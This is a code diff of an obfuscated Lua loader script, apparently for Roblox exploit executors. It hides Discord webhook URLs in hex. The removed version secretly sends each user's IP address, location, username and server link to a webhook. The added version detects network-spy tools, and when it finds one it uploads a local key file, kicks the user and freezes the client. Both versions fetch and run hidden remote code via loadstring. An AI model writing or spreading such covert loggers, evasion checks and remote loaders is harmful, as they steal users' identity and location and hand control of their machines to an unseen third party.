@@ -1,40 +1,74 @@
-if shared._NK_STAGE ~= "SHIELD_PASSED" then game.Players.LocalPlayer:Kick("Stage 1 Missing") return end
-shared._NK_STAGE = "INFORMANT_PASSED"
-
-local function _H(h)
+local function _D(h)
     local s = ""
     for i = 1, #h, 2 do s = s .. string.char(tonumber(h:sub(i, i+1), 16)) end
     return s
 end
 
-local _W = _H("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531393430393931353135383835393738382F73773463755770452D5332535659484D3072314D53455676613858694C63455F655064522D52777178665751393463485063635273643032527763565973473737416761")
-local _lp = game.Players.LocalPlayer
-local _HS = game:GetService("HttpService")
+local _req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+local _L = game:GetService("Players").LocalPlayer
+local _H = game:GetService("HttpService")
 
-pcall(function()
-    local req = (syn and syn.request or request or http_request)
-    local r = req({Url = "http://ip-api.com/json/", Method = "GET"})
-    local ni = r and r.Success and _HS:JSONDecode(r.Body) or {}
+local function _SC()
+    if not _req then return false end
+    local ok, info = pcall(debug.getinfo, _req)
+    if ok and info and (info.source ~= "=[C]" or info.what ~= "C") then return "HOOKED_REQUEST" end
+    local ok2, info2 = pcall(debug.getinfo, game.HttpGet)
+    if ok2 and info2 and info2.source ~= "=[C]" then return "HOOKED_HTTPGET" end
     
-    local jid = game.JobId == "" and "Unknown" or game.JobId
-    local jLink = "https://tinyurl.com/api-create.php?url=" .. _HS:UrlEncode("roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jid)
-    local jFinal = "N/A" pcall(function() local jr = req({Url = jLink, Method = "GET"}) if jr.Success then jFinal = jr.Body end end)
+    local cg = game:GetService("CoreGui")
+    local env = getgenv()
+    for _, n in ipairs({"SimpleSpy", "HttpSpy", "HydroSpy", "VGG Spy", "TwiSpy", "NotDSF"}) do
+        if cg:FindFirstChild(n) or env[n] then return "SPY_FOUND_" .. n end
+    end
     
-    local u = 0
-    for _, f in ipairs({"getgenv", "getrawmetatable", "hookfunction", "setreadonly"}) do if getgenv()[f] then u = u + 1 end end
+    local mt = getrawmetatable(game)
+    if mt and mt.__namecall then
+        local ok3, info3 = pcall(debug.getinfo, mt.__namecall)
+        if ok3 and info3 and info3.source:lower():find("spy") then return "NAMECALL_HOOK" end
+    end
     
-    req({Url = _W, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = _HS:JSONEncode({
-        embeds = {{
-            title = "Execution Log", color = 65280,
-            fields = {
-                {name = "Player", value = _lp.Name .. " (" .. _lp.UserId .. ")", inline = true},
-                {name = "Executor", value = (identifyexecutor and identifyexecutor() or "Unknown") .. " (" .. math.floor((u/4)*100) .. "%)", inline = true},
-                {name = "Network", value = string.format("IP: %s\nLoc: %s, %s", ni.query or "N/A", ni.country or "N/A", ni.city or "N/A"), inline = false},
-                {name = "Links", value = string.format("[Join Server](%s) | [Profile](https://www.roblox.com/users/%s/profile)", jFinal, tostring(_lp.UserId)), inline = false}
-            }
-        }}
-    })})
-end)
+    return false
+end
 
-local _CORE_URL = _H("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F746573745F687474702F726566732F68656164732F6D61696E2F7270672E6C7561")
-loadstring(game:HttpGet(_CORE_URL))()
+local _se = _SC()
+if _se then
+    local _A = _D("68747470733A2F2F646973636F72642E636F6D2F6170692F776562686F6F6B732F313531383333343033353838383138313237312F733164313841767532456D57707A547254306A4E49686A543665314A3537595837304F58484D567878637975535377364C366E7242416A7756737067612D4C37534E4B4F")
+    local tk = "N/A" pcall(function() tk = readfile("nazarkus_key.json") end)
+    pcall(function()
+        _req({
+            Url = _A, Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = _H:JSONEncode({
+                embeds = {{
+                    title = "Security Alert: Advanced Interceptor Detected",
+                    color = 16711680,
+                    fields = {
+                        {name = "Player", value = _L.Name .. " (" .. _L.UserId .. ")", inline = true},
+                        {name = "Detection", value = tostring(_se), inline = true},
+                        {name = "Device Key", value = "```" .. tk .. "```", inline = false}
+                    }
+                }}
+            })
+        })
+    end)
+    _L:Kick("Security Tamper Detected. Session Blocked.")
+    while true do end return
+end
+
+local _TS = game:GetService("TestService")
+local _ST = _TS:FindFirstChild("__NK_RUNTIME") or Instance.new("Folder", _TS)
+_ST.Name = "__NK_RUNTIME"
+local _AU = Instance.new("StringValue", _ST)
+_AU.Name = _L.Name
+_AU.Value = "V8_SECURE_AUTH"
+shared._NK_AUTH = "V8_SECURE_AUTH"
+
+-- ИСПРАВЛЕННАЯ ССЫЛКА (без буквы 'a')
+local _G = _D("68747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F697473656173797270672F746573745F687474702F726566732F68656164732F6D61696E2F7270672E6C7561")
+local ok, res = pcall(function() return game:HttpGet(_G) end)
+if ok and res then
+    local f = loadstring(res)
+    if f then task.spawn(f) end
+else
+    _L:Kick("Error 0x82: Connection failed")
+end
